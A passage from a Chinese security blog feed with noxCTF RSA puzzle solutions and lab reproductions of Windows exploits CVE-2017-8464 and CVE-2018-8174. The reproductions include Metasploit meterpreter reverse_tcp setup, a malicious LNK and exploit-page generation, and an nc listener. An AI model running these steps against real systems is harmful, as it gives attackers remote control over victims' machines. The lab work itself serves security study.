class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Today I ate in a Chinese restaurant and got myself a fortune cookie. These things usually contain a note with a nice sentence or phrase, but mine had numbers in it instead! Can you help me find the meaning of the numbers?</span><br><span class="line"></span><br><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line"></span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line"></span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line"></span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line"></span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></table></figure></p><p>这个考的是中国剩余定理,参考这篇文章，<a href="https://www.rootnetsec.com/picoctf-weird-rsa/" target="_blank" rel="noopener">https://www.rootnetsec.com/picoctf-weird-rsa/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> crypto_commons.rsa.rsa_commons <span class="keyword">import</span> modinv, rsa_printable</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span></span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span></span><br><span class="line"></span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span></span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line">qinv = modinv(q, p)</span><br><span class="line">m1 = pow(c, dp, p)</span><br><span class="line">m2 = pow(c, dq, q)</span><br><span class="line">h = (qinv * (m1 - m2)) % p</span><br><span class="line">m = m2 + h * q</span><br><span class="line">str=hex(m)</span><br><span class="line">str=str[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(int(<span class="string">''</span>.join(c), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> zip(str[<span class="number">0</span>::<span class="number">2</span>],str[<span class="number">1</span>::<span class="number">2</span>])])</span><br></pre></td></tr></table></figure><p><a href="https://github.com/p4-team/crypto-commons" target="_blank" rel="noopener">https://github.com/p4-team/crypto-commons</a><br>下载这个库，<code>sudo python setup.py install</code>安装下。</p><p>flag:<code>noxCTF{W31c0m3_70_Ch1n470wn}</code></p><h2 id="WTF"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</h2><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Um uhhhhhhhhh WTF IS THIS?! I give up. Now you try to solve this.</span><br><span class="line"></span><br><span class="line">N = lObAbAbSBlZOOEBllOEbblTlOAbOlTSBATZBbOSAEZTZEAlSOggTggbTlEgBOgSllEEOEZZOSSAOlBlAgBBBBbbOOSSTOTEOllbZgElgbZSZbbSTTOEBZZSBBEEBTgESEgAAAlAOAEbTZBZZlOZSOgBAOBgOAZEZbOBZbETEOSBZSSElSSZlbBSgbTBOTBSBBSOZOAEBEBZEZASbOgZBblbblTSbBTObAElTSTOlSTlATESEEbSTBOlBlZOlAOETAZAgTBTSAEbETZOlElBEESObbTOOlgAZbbOTBOBEgAOBAbZBObBTg</span><br><span class="line"></span><br><span class="line">e = lBlbSbTASTTSZTEASTTEBOOAEbEbOOOSBAgABTbZgSBAZAbBlBBEAZlBlEbSSSETAlSOlAgAOTbETAOTSZAZBSbOlOOZlZTETAOSSSlTZOElOOABSZBbZTSAZSlASTZlBBEbEbOEbSTAZAZgAgTlOTSEBEAlObEbbgZBlgOEBTBbbSZAZBBSSZBOTlTEAgBBSZETAbBgEBTATgOZBTllOOSSTlSSTOSSZSZAgSZATgbSOEOTgTTOAABSZEZBEAZBOOTTBSgSZTZbOTgZTTElSOATOAlbBZTBlOTgOSlETgTBOglgETbT</span><br><span class="line"></span><br><span class="line">c = SOSBOEbgOZTZBEgZAOSTTSObbbbTOObETTbBAlOSBbABggTOBSObZBbbggggZZlbBblgEABlATBESZgASBbOZbASbAAOZSSgbAOZlEgTAlgblBTbBSTAEBgEOEbgSZgSlgBlBSZOObSlgAOSbbOOgEbllAAZgBATgEAZbBEBOAAbZTggbOEZSSBOOBZZbAAlTBgBOglTSSESOTbbSlTAZATEOZbgbgOBZBBBBTBTOSBgEZlOBTBSbgbTlZBbbOBbTSbBASBTlglSEAEgTOSOblAbEgBAbOlbOETAEZblSlEllgTTbbgb</span><br></pre></td></tr></table></figure></p><p>看见<code>e</code>的这么大的值，它可能是Wiener攻击或变体，但是用一种不知道是什么的编码进行了加密，仔细看看这个<code>e</code>的值，我们发现他有一个特点:</p><p><code>[&#39;A&#39;, &#39;b&#39;, &#39;E&#39;, &#39;g&#39;, &#39;l&#39;, &#39;O&#39;, &#39;S&#39;, &#39;B&#39;, &#39;T&#39;, &#39;Z&#39;]</code></p><p>只有这十个字符组成，于是有了个大胆的想法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&apos;O&apos; --&gt; 0</span><br><span class="line">&apos;l&apos; --&gt; 1</span><br><span class="line">&apos;Z&apos; --&gt; 2</span><br><span class="line">&apos;E&apos; --&gt; 3</span><br><span class="line">&apos;A&apos; --&gt; 4</span><br><span class="line">&apos;S&apos; --&gt; 5</span><br><span class="line">&apos;b&apos; --&gt; 6</span><br><span class="line">&apos;T&apos; --&gt; 7</span><br><span class="line">&apos;B&apos; --&gt; 8</span><br><span class="line">&apos;g&apos; --&gt; 9</span><br></pre></td></tr></table></figure></p><p>将<code>e</code>解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jiemi</span><span class="params">(str1)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"AbEglOSBTZ"</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line">    str1 = str1.replace(<span class="string">"O"</span>, <span class="string">'0'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"l"</span>, <span class="string">'1'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"Z"</span>, <span class="string">'2'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"E"</span>, <span class="string">'3'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"A"</span>, <span class="string">'4'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"S"</span>, <span class="string">'5'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"b"</span>, <span class="string">'6'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"T"</span>, <span class="string">'7'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"B"</span>, <span class="string">'8'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"g"</span>, <span class="string">'9'</span>)</span><br><span class="line">    <span class="keyword">return</span> str1</span><br></pre></td></tr></table></figure><p>得到<code>e=18165674577527345773800436360005849487629584246818834218136555374150149407637407524285601002127374055517203100485286275425145721883636036574242949710753834106366928190387866524288552807173498852374689387479028711005571557055252495247965030797704485232834280077859527260792773150470416827810790513797809193767</code></p><p>再利用<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">winner attack</a>攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="string">'lObAbAbSBlZOOEBllOEbblTlOAbOlTSBATZBbOSAEZTZEAlSOggTggbTlEgBOgSllEEOEZZOSSAOlBlAgBBBBbbOOSSTOTEOllbZgElgbZSZbbSTTOEBZZSBBEEBTgESEgAAAlAOAEbTZBZZlOZSOgBAOBgOAZEZbOBZbETEOSBZSSElSSZlbBSgbTBOTBSBBSOZOAEBEBZEZASbOgZBblbblTSbBTObAElTSTOlSTlATESEEbSTBOlBlZOlAOETAZAgTBTSAEbETZOlElBEESObbTOOlgAZbbOTBOBEgAOBAbZBObBTg'</span></span><br><span class="line"></span><br><span class="line">e = <span class="string">'lBlbSbTASTTSZTEASTTEBOOAEbEbOOOSBAgABTbZgSBAZAbBlBBEAZlBlEbSSSETAlSOlAgAOTbETAOTSZAZBSbOlOOZlZTETAOSSSlTZOElOOABSZBbZTSAZSlASTZlBBEbEbOEbSTAZAZgAgTlOTSEBEAlObEbbgZBlgOEBTBbbSZAZBBSSZBOTlTEAgBBSZETAbBgEBTATgOZBTllOOSSTlSSTOSSZSZAgSZATgbSOEOTgTTOAABSZEZBEAZBOOTTBSgSZTZbOTgZTTElSOATOAlbBZTBlOTgOSlETgTBOglgETbT'</span></span><br><span class="line"></span><br><span class="line">c = <span class="string">'SOSBOEbgOZTZBEgZAOSTTSObbbbTOObETTbBAlOSBbABggTOBSObZBbbggggZZlbBblgEABlATBESZgASBbOZbASbAAOZSSgbAOZlEgTAlgblBTbBSTAEBgEOEbgSZgSlgBlBSZOObSlgAOSbbOOgEbllAAZgBATgEAZbBEBOAAbZTggbOEZSSBOOBZZbAAlTBgBOglTSSESOTbbSlTAZATEOZbgbgOBZBBBBTBTOSBgEZlOBTBSbgbTlZBbbOBbTSbBASBTlglSEAEgTOSOblAbEgBAbOlbOETAEZblSlEllgTTbbgb'</span></span><br><span class="line"></span><br><span class="line">lookup = [<span class="string">'O'</span>, <span class="string">'l'</span>, <span class="string">'Z'</span>, <span class="string">'E'</span>, <span class="string">'A'</span>, <span class="string">'S'</span>, <span class="string">'b'</span>, <span class="string">'T'</span>, <span class="string">'B'</span>, <span class="string">'g'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(x)</span>:</span></span><br><span class="line">    ans = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> x:</span><br><span class="line">        ans += str(lookup.index(c))</span><br><span class="line">    <span class="keyword">return</span> int(ans)</span><br><span class="line"></span><br><span class="line">n = decode(n)</span><br><span class="line">e = decode(e)</span><br><span class="line">c = decode(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cf_expansion</span><span class="params">(n, d)</span>:</span></span><br><span class="line">    e = []</span><br><span class="line"></span><br><span class="line">    q = n // d</span><br><span class="line">    r = n % d</span><br><span class="line">    e.append(q)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> r != <span class="number">0</span>:</span><br><span class="line">        n, d = d, r</span><br><span class="line">        q = n // d</span><br><span class="line">        r = n % d</span><br><span class="line">        e.append(q)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents</span><span class="params">(e)</span>:</span></span><br><span class="line">    n = [] <span class="comment"># Nominators</span></span><br><span class="line">    d = [] <span class="comment"># Denominators</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(e)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            ni = e[i]</span><br><span class="line">            di = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">            ni = e[i]*e[i<span class="number">-1</span>] + <span class="number">1</span></span><br><span class="line">            di = e[i]</span><br><span class="line">        <span class="keyword">else</span>: <span class="comment"># i &gt; 1</span></span><br><span class="line">            ni = e[i]*n[i<span class="number">-1</span>] + n[i<span class="number">-2</span>]</span><br><span class="line">            di = e[i]*d[i<span class="number">-1</span>] + d[i<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line">        n.append(ni)</span><br><span class="line">        d.append(di)</span><br><span class="line">        <span class="keyword">yield</span> (ni, di)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(b, c)</span>:</span></span><br><span class="line">    k = b * b - <span class="number">4</span> * <span class="number">1</span> * c</span><br><span class="line">    <span class="keyword">if</span> k &lt; <span class="number">0</span>: <span class="keyword">return</span> []</span><br><span class="line">    sk, complete = gmpy2.iroot(k, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> complete: <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">return</span> [int((-b + sk) // <span class="number">2</span>), int((-b - sk) // <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    kd = convergents(cf_expansion(e, n))</span><br><span class="line">    <span class="keyword">for</span> i, (k, d) <span class="keyword">in</span> enumerate(kd):</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        roots = solve(phi - n - <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> len(roots) == <span class="number">2</span>:</span><br><span class="line">            p, q = roots</span><br><span class="line">            <span class="keyword">if</span> p * q == n:</span><br><span class="line">                <span class="keyword">return</span> (p, q)</span><br><span class="line"></span><br><span class="line">p, q = wiener(e, n)</span><br><span class="line"></span><br><span class="line">r = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, r)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>flag:<code>noxCTF{RSA_1337_10rd}</code></p><p>首发于ichunqiu<br><a href="https://bbs.ichunqiu.com/thread-45809-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-45809-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;What is your refere
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-8464漏洞复现</title>
    <link href="https://threst.github.io/2018/09/11/CVE-2017-8464%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://threst.github.io/2018/09/11/CVE-2017-8464漏洞复现/</id>
    <published>2018-09-11T07:28:14.000Z</published>
    <updated>2018-09-11T07:28:55.696Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，<br>攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。 当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。<br>注释:<code>.LNK</code>是windows系统内应用程序快捷方式文件的文件类型后缀名。<br>漏洞利用条件和方式:<br>远程利用 漏洞影响范围:<br>Microsoft Windows 10 Version 1607 for 32-bit SystemsMicrosoft Windows 10 Version 1607 for x64-based SystemsMicrosoft Windows 10 for 32-bit SystemsMicrosoft Windows 10 for x64-based SystemsMicrosoft Windows 10 version 1511 for 32-bit SystemsMicrosoft Windows 10 version 1511 for x64-based SystemsMicrosoft Windows 10 version 1703 for 32-bit SystemsMicrosoft Windows 10 version 1703 for x64-based SystemsMicrosoft Windows 7 for 32-bit Systems SP1Microsoft Windows 7 for x64-based Systems SP1Microsoft Windows 8.1 for 32-bit SystemsMicrosoft Windows 8.1 for x64-based SystemsMicrosoft Windows RT 8.1</p><h2 id="win7x64本地复现"><a href="#win7x64本地复现" class="headerlink" title="win7x64本地复现"></a>win7x64本地复现</h2><p>kalix64   192.168.1.101  攻击机<br>windows7x64  192.168.1.111  目标靶机</p><h4 id="0x000下载msf脚本"><a href="#0x000下载msf脚本" class="headerlink" title="0x000下载msf脚本"></a>0x000下载msf脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/metasploit-framework/modules/exploits/windows/fileformat/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wget https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb</span><br></pre></td></tr></table></figure><h4 id="0x01生成监听shell"><a href="#0x01生成监听shell" class="headerlink" title="0x01生成监听shell"></a>0x01生成监听shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf  exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.1.101</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br></pre></td></tr></table></figure><h4 id="0x02生成-LNK文件"><a href="#0x02生成-LNK文件" class="headerlink" title="0x02生成.LNK文件"></a>0x02生成.LNK文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; back</span><br><span class="line">msf &gt; use exploits/windows/fileformat/cve_2017_8464_lnk_rce</span><br><span class="line">msf exploit(windows/fileformat/cve_2017_8464_lnk_rce) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/fileformat/cve_2017_8464_lnk_rce) &gt; set LHOST 192.168.1.101</span><br><span class="line">LHOST =&gt; 192.168.1.101</span><br><span class="line">msf exploit(windows/fileformat/cve_2017_8464_lnk_rce) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/09/11/5b976ddb0f95a.png" alt=""></p><h4 id="0x03复制到win7运行"><a href="#0x03复制到win7运行" class="headerlink" title="0x03复制到win7运行"></a>0x03复制到win7运行</h4><p><img src="https://i.loli.net/2018/09/11/5b976ddb39d97.png" alt=""></p><h4 id="0x04最后"><a href="#0x04最后" class="headerlink" title="0x04最后"></a>0x04最后</h4><p><img src="https://i.loli.net/2018/09/11/5b976ddb87cfb.png" alt=""></p><p><code>sessions -i 1</code></p><p><img src="https://i.loli.net/2018/09/11/5b976ddb52098.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/backlion/p/7243636.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/7243636.html</a><br><a href="https://github.com/ykoster/metasploit-framework/blob/b669b9fb81efdec4f59177116ee9524d71527d37/documentation/modules/exploit/windows/fileformat/cve_2017_8464_lnk_rce.md" target="_blank" rel="noopener">https://github.com/ykoster/metasploit-framework/blob/b669b9fb81efdec4f59177116ee9524d71527d37/documentation/modules/exploit/windows/fileformat/cve_2017_8464_lnk_rce.md</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Lnk%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-8464)%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Windows-Lnk%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-8464)%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在解析快捷方式时存在
      
    
    </summary>
    
    
      <category term="CVE-2017-8464" scheme="https://threst.github.io/tags/CVE-2017-8464/"/>
    
  </entry>
  
  <entry>
    <title>双杀0day漏洞(CVE-2018-8174)复现</title>
    <link href="https://threst.github.io/2018/09/09/%E5%8F%8C%E6%9D%800day%E6%BC%8F%E6%B4%9E(CVE-2018-8174)%E5%A4%8D%E7%8E%B0/"/>
    <id>https://threst.github.io/2018/09/09/双杀0day漏洞(CVE-2018-8174)复现/</id>
    <published>2018-09-09T14:13:14.000Z</published>
    <updated>2018-09-09T05:41:27.091Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h2><p>CVE-2018-8174 是 Windows VBScript Engine 代码执行漏洞。<br>微软在4月20日早上确认此漏洞，并于5月8号发布了官方安全补丁，对该 0day 漏洞进行了修复，将其命名为 CVE-2018-8174<br>由于 VBScript 脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码。</p><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>攻击机 IP：192.168.1.101<br>靶机 IP：192.168.1.111</p><p>github:<a href="https://github.com/Yt1g3r/CVE-2018-8174_EXP" target="_blank" rel="noopener">https://github.com/Yt1g3r/CVE-2018-8174_EXP</a></p><h2 id="0x01-生成payload"><a href="#0x01-生成payload" class="headerlink" title="0x01 生成payload"></a>0x01 生成payload</h2><p><code>python CVE-2018-8174.py -u http://192.168.1.101/ -o exp.rtf -i 192.168.1.101 -p 4444</code></p><p><code>-u</code>:url地址<br><code>-o</code>: 输出文件<br><code>-i</code>：监听地址<br><code>-p</code>：监听端口</p><h2 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h2><p>把 explot.html 复制到 /var/www/html/，并开启 apache 服务</p><p><code>sudo cp exploit.html /var/www/html/</code></p><p>开启Apache服务<br><code>sudo service  apache2 start</code></p><p>攻击机监听端口<br><code>nc -lvvp 4444</code></p><p>靶机使用IE打开URL<br><code>http://192.168.1.101/exploit.html</code></p><p>靶机打开生成的Word文档也是一样的，可是我没测试成功</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞描述：&quot;&gt;&lt;a href=&quot;#漏洞描述：&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述：&quot;&gt;&lt;/a&gt;漏洞描述：&lt;/h2&gt;&lt;p&gt;CVE-2018-8174 是 Windows VBScript Engine 代码执行漏洞。&lt;br&gt;微软在4月20
      
    
    </summary>
    
    
      <category term="CVE-2018-8174" scheme="https://threst.github.io/tags/CVE-2018-8174/"/>
    
  </entry>
  
  <entry>
    <title>ctf之隱寫術</title>
    <link href="https://threst.github.io/2018/08/28/CTF%E4%B9%8B%E9%9A%90%E5%86%99%E6%9C%AF/"/>
    <id>https://threst.github.io/2018/08/28/CTF之隐写术/</id>
    <published>2018-08-28T14:13:14.000Z</published>
    <updated>2018-08-28T03:32:30.290Z</updated>
    
    <content type="html"><![CDATA[<h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><p>做了这么多的ctf比赛，告诉我个道理——再少不会少隐写！！！隐写题可是每次比赛都有的，But回顾过去，摸着自己的良心说那次解题不是用工具去套，套中了就解开了，没套中就凉了，于是在这种大背景下，我打算写一篇关于隐写的系(xia)统(che）的文章。各位师傅看就看，别骂人。</p><h2 id="what-is-隐写？"><a href="#what-is-隐写？" class="headerlink" title="what is 隐写？"></a>what is 隐写？</h2><p>参考百度上面说就是：隐写术(Steganography)是一门关于信息隐藏的技巧与科学，所谓信息隐藏指的是不让除预期的接收者之外的任何人知晓信息的传递事件或者信息的内容。这里提到了信息隐藏技术，粗略的说下，信息隐藏技术不仅仅只包括隐写术，还有数字水印，隐蔽信道，阀下信道，匿名通信这几种，但是我们都不需要了解，其中数字水印主要应用于产权保护，而隐写术主要应用于通信。</p><h2 id="隐写术应用场景"><a href="#隐写术应用场景" class="headerlink" title="隐写术应用场景"></a>隐写术应用场景</h2><p>要说隐写术的应用不得不提下伟大的Simmons模型，由于最近在看&lt;你好，旧时光&gt;(真心好看)，就拿林杨和余周周来打比方。<br>1.林杨和余周周分属两个教室，一个文科，一个理科。<br>2.为了将同学情谊升华需要进行通信，而通信的短信必须经过中间的潘主任的审阅。<br>3.潘主任可以阅读短信的内容，而且阅读后可以判断他们是否早恋。</p><h4 id="分析："><a href="#分析：" class="headerlink" 